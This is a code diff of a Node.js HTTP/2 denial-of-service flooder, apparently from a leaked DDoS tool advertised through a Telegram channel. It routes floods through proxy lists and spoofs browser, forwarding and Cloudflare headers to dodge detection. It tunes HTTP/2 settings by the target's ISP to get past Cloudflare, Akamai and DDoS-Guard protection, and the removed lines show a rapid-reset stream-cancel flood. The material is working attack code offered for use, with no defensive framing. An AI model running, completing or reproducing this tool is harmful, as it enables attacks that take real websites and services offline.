+          host: address[0],
+          port: +address[1]
+        }
+      }, (error, info) => {
+        if (error) {
+          return callback(undefined, error);
+        } else {
+          return callback(info.socket, undefined);
+        }
+      });
+     }
+  HTTP(options, callback) {
+     const parsedAddr = options.address.split(":");
+     const addrHost = parsedAddr[0];
+     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
+     const buffer = new Buffer.from(payload);
+     const connection = net.connect({
+        host: options.host,
+        port: options.port,
+    });
+
+    connection.setTimeout(options.timeout * 100000);
+    connection.setKeepAlive(true, 100000);
+    connection.setNoDelay(true)
+    connection.on("connect", () => {
+       connection.write(buffer);
+   });
+
+   connection.on("data", chunk => {
+       const response = chunk.toString("utf-8");
+       const isAlive = response.includes("HTTP/1.1 200");
+       if (isAlive === false) {
+           connection.destroy();
+           return callback(undefined, "error: invalid response from proxy server");
+       }
+       return callback(connection, undefined);
+   });
+
+   connection.on("timeout", () => {
+       connection.destroy();
+       return callback(undefined, "error: timeout exceeded");
+   });
+
+}
 }
 
-async function main() {
+
+ const Socker = new NetSocket();
+ 
+ function readLines(filePath) {
+     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+ }
+
+
+ const lookupPromise = util.promisify(dns.lookup);
+let val;
+let isp;
+let pro;
+
+async function getIPAndISP(url) {
     try {
-        const fingerprint = await getJA3Fingerprint();  
-        hd['ja3-fingerprint']= fingerprint  
+        const fetch = await getFetch(); 
+        const { address } = await lookupPromise(url);
+        const apiUrl = `http://ip-api.com/json/${address}`;
+        const response = await fetch(apiUrl);
+        if (response.ok) {
+            const data = await response.json();
+            isp = data.isp;
+            console.log('Target: ', url, ':', isp);
+        } else {
+            return;
+        }
     } catch (error) {
-        
+        return;
     }
 }
 
+const targetURL = parsedTarget.host;
 
-main();
-	const client = await http2.connect(parsed.href, {
-			createConnection: () => tlsSocket
-			, settings: {  
-       enablePush: false,      
-			},
-       rejectUnauthorized: false,
-			 enableConnectProtocol: false,
-			 allowHTTP1: true
-		});
-   const streams = [];
-      client.on('stream', (stream, headers) => {
-        if (isp === 'Akamai Technologies, Inc.') {
-            stream.priority = Math.random() < 0.5 ? 0 : 1;
-            stream.connection.localSettings[http2.constants.SETTINGS_HEADER_TABLE_SIZE(0x01)] = 4096;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
-            stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16384;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_HEADER_LIST_SIZE(0x06)] = 32768;
-        } else if (isp === 'Cloudflare, Inc.') {
-            stream.priority = Math.random() < 0.5 ? 0 : 1;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x04)] =
-            Math.random() < 0.5 ? 16777215 : 16384;
-            stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x05)] =
-            Math.random() < 0.5 ? 65536 : 65535;
-        } else if (isp === 'Ddos-guard LTD') {
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 8;
-            stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 16777215;
-        } else if (isp === 'Amazon.com, Inc.') {
-            stream.priority = Math.random() < 0.5 ? 0 : 1;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
-            stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
-        } else if (isp === 'Google LLC') {
-            stream.priority = Math.random() < 0.5 ? 0 : 1;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 200;
-            stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 131072;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 32768;
-        } else if (isp === 'Microsoft Corporation') {
-            stream.priority = Math.random() < 0.5 ? 0 : 1;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 50;
-            stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65536;
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_FRAME_SIZE(0x05)] = 8192;
-        } else {
-    // Default settings for other ISPs
-            stream.connection.localSettings[http2.constants.SETTINGS_MAX_CONCURRENT_STREAMS(0x03)] = 100;
-            stream.connection.localSettings[http2.constants.SETTINGS_INITIAL_WINDOW_SIZE(0x04)] = 65535;
-        }
-        streams.push(stream);
-    })
+getIPAndISP(targetURL);
+const MAX_RAM_PERCENTAGE = 100;
+const RESTART_DELAY = 1000;
 
-		client.on("connect", async () => {
-			setInterval(async () => {
-		  	for (let i = 0; i < rps; i++) {
-  const request = await client.request(dynHeaders);
-  const request1 = await client.request(dynHeaders);
-  const request2 = await client.request(dynHeaders);
-  	request.end()
-	request1.end()
-	request2.end()
-  
-  				}
-			}, interval);
-		});
-		if (streams.length > 0) {
-  const streamToReset = streams[0];
-
-  client.rstStream(streamToReset.id, 8);
-  return flood()
+function getRandomHeapSize() {
+    // Random t? 512MB d?n 2048MB
+    const min = 1000;
+    const max = 6222;
+    return Math.floor(Math.random() * (max - min + 1)) + min;
 }
-		client.on("close", () => {
-			client.destroy();
-			tlsSocket.destroy();
-			socket.destroy();
-			return flood()
-		});
+if (cluster.isMaster) {
+    console.clear();
+    console.log(`t.me/leakddosfiles`.bgRed), console.log(`[!] Codesyntax HTTP/2`);
+    console.log(`--------------------------------------------`.gray);
+    console.log(`Target: `.red + process.argv[2].white);
+    console.log(`Time: `.red + process.argv[3].white);
+    console.log(`Rate: `.red + process.argv[4].white);
+    console.log(`Thread: `.red + process.argv[5].white);
+    console.log(`ProxyFile: `.red + process.argv[6].white);
+    console.log(`--------------------------------------------`.gray);
 
-		client.on('timeout', async () => {
-		await client.destroy();
-		await tlsSocket.destroy();
-		await socket.destroy();
-		return flood()
-		});
+    const restartScript = () => {
+        for (const id in cluster.workers) {
+            cluster.workers[id].kill();
+        }
 
+        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
+        setTimeout(() => {
+            for (let counter = 1; counter <= args.threads; counter++) {
+                const heapSize = getRandomHeapSize();
+                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
+            }
+        }, RESTART_DELAY);
+    };
 
+    const handleRAMUsage = () => {
+        const totalRAM = os.totalmem();
+        const usedRAM = totalRAM - os.freemem();
+        const ramPercentage = (usedRAM / totalRAM) * 100;
 
-client.on("error", async (error) => {
-	        if (error){
-				await client.destroy();
-				await tlsSocket.destroy();
-				await socket.destroy();
-				 return flood()
-			}
+        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
+            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
+            restartScript();
+        }
+    };
+
+    setInterval(handleRAMUsage, 5000);
+
+    for (let counter = 1; counter <= args.threads; counter++) {
+        const heapSize = getRandomHeapSize();
+        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
+    }
+} else {
+    setInterval(runFlooder, 1); // Gi? s? runFlooder du?c d?nh nghia v? g?i m?i gi?y
+}
+  function runFlooder() {
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
+    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
+function randstr(length) {
+    const characters = "0123456789";
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+};
+function taoDoiTuongNgauNhien() {
+    const doiTuong = {};
+    function getRandomNumber(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+  }
+  maxi = getRandomNumber(2,3)
+    for (let i = 1; i <=maxi ; i++) {
+      
+      
+  
+   const key = 'cf-sec-'+ generateRandomString(1,9)
+  
+      const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
+  
+      doiTuong[key] = value;
+    }
+  
+    return doiTuong;
+  }
+const browsers = ["chrome", "duckduckgo", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
+const getRandomBrowser = () => {
+    const randomIndex = Math.floor(Math.random() * browsers.length);
+    return browsers[randomIndex];
+};
+const generateHeaders = (browser) => {
+    const versions = {
+        chrome: { min: 115, max: 124 },
+        duckduckgo: { min: 12, max: 16 },
+        safari: { min: 12, max: 16 },
+        brave: { min: 115, max: 124 },
+        firefox: { min: 99, max: 112 },
+        mobile: { min: 85, max: 105 },
+        opera: { min: 70, max: 90 },
+        operagx: { min: 70, max: 90 }
+    };
+
+    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
+    const fullVersions = {
+        brave: "1.71.118",
+        duckduckgo: "91.0",
+        chrome: "118.0.5993.122",
+        firefox: "131.0.3",
+        safari: "17.4",
+        mobile: "125.0.6775.55",
+        opera: "114.0.5282.102",
+        operagx: "114.0.5282.123"
+    };
+
+    // T?o header "Sec-CH-UA-Full-Version-List" t? gi? tr? full version
+    const secChUAFullVersionList = Object.keys(fullVersions)
+        .map(key => `"${key}";v="${fullVersions[key]}"`)
+        .join(", ");
+    const platforms = {
+        chrome: "Win64",
+        duckduckgo: "macOS",
+        safari: "macOS",
+        brave: "Linux",
+        firefox: "Linux",
+        mobile: "Android",
+        opera: "Linux",
+        operagx: "Linux"
+    };
+    const platform = platforms[browser];
+
+    const userAgent = {
+        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
+        duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} DuckDuckGo/7 Safari/605.1.15`,
+        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
+        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
+        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
+        mobile: `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
+        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
+        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
+    };
+    const secFetchUser = Math.random() <0.75 ?"?1;?1":"?1";
+    const secChUaMobile = browser === "mobile" ? "?1" : "?0";
+    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
+    const accept = Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json";
+    const headersMap = {
+        brave: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.brave,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.brave
+        },
+        duckduckgo: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"DuckDuckGo";v="${version}", "AppleWebKit";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.chrome,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.duckduckgo
+        },
+        chrome: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.chrome,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.chrome
+        },
+        firefox: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.firefox,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.firefox
+        },
+        safari: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Safari";v="${version}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.safari,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.safari
+        },
+        mobile: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+           ":path": parsedTarget.path,
+            "sec-ch-ua": `"Chromium";v="${version}", "Mobile";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.mobile,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.mobile
+        },
+        opera: {
+            ":method": "GET",
+            ":authority":Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+           ":path": parsedTarget.path,
+            "sec-ch-ua": `"Chromium";v="${version}", "Opera";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.operagx,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.opera
+        },
+        operagx: {
+            ":method": "GET",
+            ":authority":Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Chromium";v="${version}", "Opera GX";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.operagx,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+           "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+           "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.operagx
+        }
+    };
+
+    return headersMap[browser];
+};
+const browser = getRandomBrowser();
+const headers = generateHeaders(browser);
+function getWeightedRandom() {
+    const randomValue = Math.random() * Math.random();
+    return randomValue < 0.25;
+}
+const randomString = randstr(10);
+const rateHeaders1 = [
+  { "X-Forwarded-For": parsedProxy[0] },
+  { "Source-IP": randstr(5) },
+  { "Vary": randstr(5) },
+  { "Attribution-Reporting-Eligible": "trigger" },
+
+  // Tambahan Rate Headers
+  { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36" },
+  { "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0" },
+  { "Pragma": "no-cache" },
+  { "Connection": "keep-alive" },
+  { "Accept": "*/*" },
+  { "Accept-Encoding": "gzip, deflate, br" },
+  { "Accept-Language": "en-US,en;q=0.9" },
+  { "X-Real-IP": parsedProxy[0] },
+  { "Forwarded": "for=" + parsedProxy[0] + ";proto=https" },
+  { "CF-IPCountry": "US" },
+  { "CF-Visitor": "{'scheme':'https'}" },
+  { "CF-Ray": randstr(16) },
+  { "Referrer-Policy": "strict-origin-when-cross-origin" },
+  { "Permissions-Policy": "geolocation=(self), microphone=()" },
+  { "Strict-Transport-Security": "max-age=31536000; includeSubDomains" },
+];
+const rateHeaders2 = [
+  { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" },
+  { "Accept-Language": "en-US,en;q=0.9" },
+  { "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp" },
+
+  // Tambahan Rate Headers
+  { "Connection": "keep-alive" },
+  { "Upgrade-Insecure-Requests": "1" },
+  { "Cache-Control": "no-cache" },
+  { "Pragma": "no-cache" },
+  { "Sec-Fetch-Site": "same-origin" },
+  { "Sec-Fetch-Mode": "navigate" },
+  { "Sec-Fetch-User": "?1" },
+  { "Sec-Fetch-Dest": "document" },
+  { "Referer": parsedTarget.host },
+  { "Accept-Encoding": "gzip, deflate, br" },
+  { "X-Forwarded-For": "192.168.1.1" },
+  { "Forwarded": "for=192.168.1.1;proto=https" },
+  { "X-Real-IP": "192.168.1.1" },
+  { "Strict-Transport-Security": "max-age=31536000; includeSubDomains" },
+  { "Permissions-Policy": "geolocation=(self), microphone=()" },
+  { "CF-IPCountry": "US" },
+  { "CF-Visitor": "{'scheme':'https'}" },
+  { "CF-Ray": "123456789abcdef0" },
+  { "X-Request-ID": Math.random().toString(36).substring(2, 15) },
+];
+const rateHeaders3 = [
+  { "A-IM": "Feed" },
+  { "dnt": 1 },
+  { "content-security-policy-report-only": "report-uri https://reporting.go-mpulse.net/report/FDSGP-LEB9B-T8Y2A-5V5ED-9WX2T" },
+
+  // Tambahan Rate Headers
+  { "X-XSS-Protection": "1; mode=block" },
+  { "X-Content-Type-Options": "nosniff" },
+  { "X-Frame-Options": "DENY" },
+  { "Referrer-Policy": "no-referrer" },
+  { "Strict-Transport-Security": "max-age=31536000; includeSubDomains" },
+  { "Permissions-Policy": "geolocation=(self), microphone=()" },
+  { "Feature-Policy": "accelerometer 'none'; ambient-light-sensor 'none'" },
+  { "Cache-Control": "no-store, no-cache, must-revalidate" },
+  { "Pragma": "no-cache" },
+  { "Upgrade-Insecure-Requests": "1" },
+  { "X-Content-Duration": "120" },
+  { "X-Forwarded-For": "192.168.1.1" },
+  { "Forwarded": "for=192.168.1.1; proto=https" },
+  { "CF-Cache-Status": "BYPASS" },
+  { "CF-RAY": "randomRayValue" },
+];
+const rateHeaders4 = [
+  { "Service-Worker-Navigation-Preload": "true" },
+  { "Supports-Loading-Mode": "credentialed-prerender" },
+  { "pragma": "no-cache" },
+  { "data-return": "false" },
+
+  // Tambahan Rate Headers
+  { "X-DNS-Prefetch-Control": "on" },
+  { "Strict-Transport-Security": "max-age=31536000; includeSubDomains" },
+  { "Cache-Control": "no-store, no-cache, must-revalidate" },
+  { "X-Content-Type-Options": "nosniff" },
+  { "X-XSS-Protection": "1; mode=block" },
+  { "Referrer-Policy": "no-referrer" },
+  { "Feature-Policy": "accelerometer 'none'; autoplay 'none'" },
+  { "Permissions-Policy": "geolocation=(self), microphone=()" },
+  { "Content-Security-Policy": "default-src 'self'; script-src 'self'; object-src 'none';" },
+  { "X-Frame-Options": "DENY" },
+  { "Upgrade-Insecure-Requests": "1" },
+  { "X-Forwarded-For": "192.168.0.1" },
+];
+		const rhd = [
+  { 'RTT': Math.floor(Math.random() * (400 - 600 + 1)) + 100 },
+  { "X-Forwarded-Proto": "https" },
+  { 'Nel': '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }' },
+  
+  // Header Tambahan
+  { "X-Real-IP": "192.168.1.1" },
+  { "X-Frame-Options": "DENY" },
+  { "Strict-Transport-Security": "max-age=31536000; includeSubDomains" },
+  { "X-XSS-Protection": "1; mode=block" },
+  { "Content-Security-Policy": "default-src 'self'; script-src 'self'; object-src 'none';" },
+  { "Feature-Policy": "geolocation 'none'; microphone 'none';" },
+  { "Cache-Control": "no-cache, no-store, must-revalidate" },
+  { "X-Content-Type-Options": "nosniff" },
+  { "Referrer-Policy": "strict-origin" },
+  { "Permissions-Policy": "accelerometer=(), geolocation=()" },
+]
+
+const hd1 = [
+  { 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' },
+  { 'Delta-Base': '12340001' },
+  { "te": "trailers" },
+
+  // Header Tambahan
+  { "Connection": "keep-alive" },
+  { "Upgrade-Insecure-Requests": "1" },
+  { "Accept-Encoding": "gzip, deflate, br" },
+  { "Accept-Language": "en-US,en;q=0.9" },
+  { "Content-Type": "application/json" },
+  { "Authorization": "Bearer someAccessToken" },
+  { "X-Requested-With": "XMLHttpRequest" },
+  { "Cache-Control": "max-age=0" },
+  { "DNT": "1" },  // Do Not Track
+  { "X-Forwarded-For": "203.0.113.195" },
+  { "Pragma": "no-cache" },
+]
+                        const headers4 = {
+  ...(Math.random() < 0.5 && { "akamai-grn": "0.14965468.1718719936.1009b53" }),
+  ...(Math.random() < 0.5 && { "x-akam-sw-version": "0.5.0" }),
+  ...(Math.random() < 0.5 && { "x-akamai-transformed": "9 - 0 pmb=mNONE,1mTOE,1mRUM,4" }),
+  ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
+  ...(Math.random() < 0.75 && { "referer": `https:/${clength}` }),
+  ...(Math.random() < 0.75 && {
+    "origin": Math.random() < 0.5
+      ? `https://${clength}${Math.random() < 0.5 ? `:${randnum(4)}/` : '@root/'}`
+      : `https://${Math.random() < 0.5 ? 'root-admin.' : 'root-root.'}${clength}`
+  }),
+  // Tambahan header untuk memperkaya fungsionalitas
+  ...(Math.random() < 0.5 && { "X-Frame-Options": "DENY" }),
+  ...(Math.random() < 0.5 && { "X-XSS-Protection": "1; mode=block" }),
+  ...(Math.random() < 0.5 && { "Strict-Transport-Security": "max-age=31536000; includeSubDomains" }),
+  ...(Math.random() < 0.5 && { "Cache-Control": "no-store, must-revalidate" }),
+};
+
+let allHeaders = Object.assign({}, headers, headers4);
+
+const dyn = {
+  ...(Math.random() < 0.5 && { "cf-mitigated": "challenge" }),
+  ...(Math.random() < 0.5 && { "origin-agent-cluster": "?1" }),
+  ...(Math.random() < 0.5 && { "Observe-Browsing-Topics": "?1" }),
+  ...(Math.random() < 0.5 && {
+    [`client-x-with-${generateRandomString(1, 9)}`]: `${generateRandomString(1, 10)}-${generateRandomString(1, 12)}=${generateRandomString(1, 12)}`
+  }),
+  ...(Math.random() < 0.5 && {
+    [`cf-sec-with-from-${generateRandomString(1, 9)}`]: `${generateRandomString(1, 10)}-${generateRandomString(1, 12)}=${generateRandomString(1, 12)}`
+  }),
+  ...(Math.random() < 0.5 && {
+    [`user-x-with-${generateRandomString(1, 9)}`]: `${generateRandomString(1, 10)}-${generateRandomString(1, 12)}=${generateRandomString(1, 12)}`
+  }),
+  [`nodejs-c-python-${generateRandomString(1, 9)}`]: `${generateRandomString(1, 10)}-${generateRandomString(1, 12)}=${generateRandomString(1, 12)}`,
+  // Tambahan header dinamis
+  ...(Math.random() < 0.5 && { "X-Real-IP": "192.168.1.1" }),
+  ...(Math.random() < 0.5 && { "X-Content-Type-Options": "nosniff" }),
+  ...(Math.random() < 0.5 && { "Permissions-Policy": "geolocation=()" }),
+};
+
+const dyn2 = {
+  ...(Math.random() < 0.5 && { "upgrade-insecure-requests": "1" }),
+  ...(Math.random() < 0.5 && { "purpose": "prefetch" }),
+  // Tambahan header dinamis untuk keamanan dan privasi
+  ...(Math.random() < 0.5 && { "X-DNS-Prefetch-Control": "on" }),
+  ...(Math.random() < 0.5 && { "Referrer-Policy": "no-referrer-when-downgrade" }),
+};  
+
+const proxyOptions = {
+    host: parsedProxy[0],
+    port: ~~parsedProxy[1],
+    address: `${parsedTarget.host}:443`,
+    timeout: 10
+};
+
+Socker.HTTP(proxyOptions, async (connection, error) => {
+    if (error) return;
+    connection.setKeepAlive(true, 600000);
+    connection.setNoDelay(true);
+
+    const settings = {
+        initialWindowSize: 15663105,
+    };
+
+    const tlsOptions = {
+        secure: true,
+        ALPNProtocols: ["h2", "http/1.2"],
+        ciphers: cipper,
+        requestCert: true,
+        sigalgs: sigalgs,
+        socket: connection,
+        ecdhCurve: ecdhCurve,
+        secureContext: secureContext,
+        honorCipherOrder: false,
+        rejectUnauthorized: false,
+        secureProtocol: Math.random() < 0.5 ? 'TLSv1_3_method' : 'TLSv1_2_method',
+        secureOptions: secureOptions,
+        host: parsedTarget.host,
+        servername: parsedTarget.host,
+    };
+    
+    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions, () => {
+    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
+    tlsSocket.allowHalfOpen = true;
+    tlsSocket.setNoDelay(true);
+    tlsSocket.setKeepAlive(true, 60000);
+    tlsSocket.setMaxListeners(0);
+
 });
 
-	});
+function generateJA3Fingerprint(socket) {
+    const cipherInfo = socket.getCipher();
+    const supportedVersions = socket.getProtocol();
+
+    if (!cipherInfo) {
+        console.error('Cipher info is not available. TLS handshake may not have completed.');
+        return null;
+    }
+
+    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
+
+    const md5Hash = crypto.createHash('md5');
+    md5Hash.update(ja3String);
+
+    return md5Hash.digest('hex');
+}
+
+tlsSocket.on('connect', () => {
+    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
+});
 
 
-	connection.on('error', (error) => {
-		connection.destroy();
-		if (error) return;
-	});
-	connection.on('timeout', () => {
-		connection.destroy();
-		return
-	});
-	connection.end();
-}//
+    function getSettingsBasedOnISP(isp) {
+        const defaultSettings = {
+            headerTableSize: 65536,
+            initialWindowSize: Math.random() < 0.5 ? 6291456: 33554432,
+            maxHeaderListSize: 262144,
+            enablePush: false,
+            maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
+            maxFrameSize: 16384,
+            enableConnectProtocol: false,
+        };
+    
+        const settings = { ...defaultSettings };
+    
+        switch (isp) {
+    case 'Cloudflare, Inc.':
+        settings.priority = 1;
+        settings.headerTableSize = 65536;
+        settings.maxConcurrentStreams = 1000;
+        settings.initialWindowSize = 6291456;
+        settings.maxFrameSize = 16384;
+        settings.enableConnectProtocol = false;
+        break;
+    case 'FDCservers.net':
+    case 'OVH SAS':
+    case 'VNXCLOUD':
+        settings.priority = 0;
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 65536;
+        settings.maxFrameSize = 16777215;
+        settings.maxConcurrentStreams = 128;
+        settings.maxHeaderListSize = 4294967295;
+        break;
+    case 'Akamai Technologies, Inc.':
